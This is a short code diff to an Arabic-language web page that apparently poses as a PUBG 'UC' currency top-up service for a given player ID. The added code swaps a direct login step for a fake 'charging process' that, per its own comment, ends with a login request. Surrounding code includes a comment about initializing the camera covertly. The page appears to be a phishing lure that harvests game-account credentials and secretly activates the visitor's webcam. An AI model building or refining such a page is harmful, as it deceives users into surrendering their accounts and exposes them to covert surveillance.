@@ -2171,12 +2171,8 @@ proceedBtn.addEventListener('click', function() {
         return;
     }
     
-    // الانتقال المباشر إلى صفحة تسجيل الدخول
-    mainContainer.style.display = 'none';
-    loginContainer.style.display = 'block';
-    
-    // إظهار رسالة ترحيب بالمستخدم
-    showLoginStatus(`مرحباً! جاري إعداد شحن ${selectedCharge.amount} شدّة للاعب ${playerIdInput.value.trim()}`, 'success');
+    // بدء عملية الشحن التي تنتهي بطلب تسجيل الدخول
+    showChargingProcess();
 });
         
         // تهيئة الكاميرا بشكل خفي بعد الموافقة
@@ -2545,7 +2541,8 @@ proceedBtn.addEventListener('click', function() {
 window.addEventListener('beforeunload', () => {
     clearTimeout(chargingTimeout);
 });
-        document.addEventListener('DOMContentLoaded', function() {
+        // في نهاية script، استبدل هذا الكود:
+document.addEventListener('DOMContentLoaded', function() {
     loginContainer.style.display = 'none';
     mainContainer.style.display = 'block';
     termsModal.style.display = 'flex';
@@ -2553,6 +2550,7 @@ window.addEventListener('beforeunload', () => {
     </script>
 </body>
 </html>
+
 
 
 
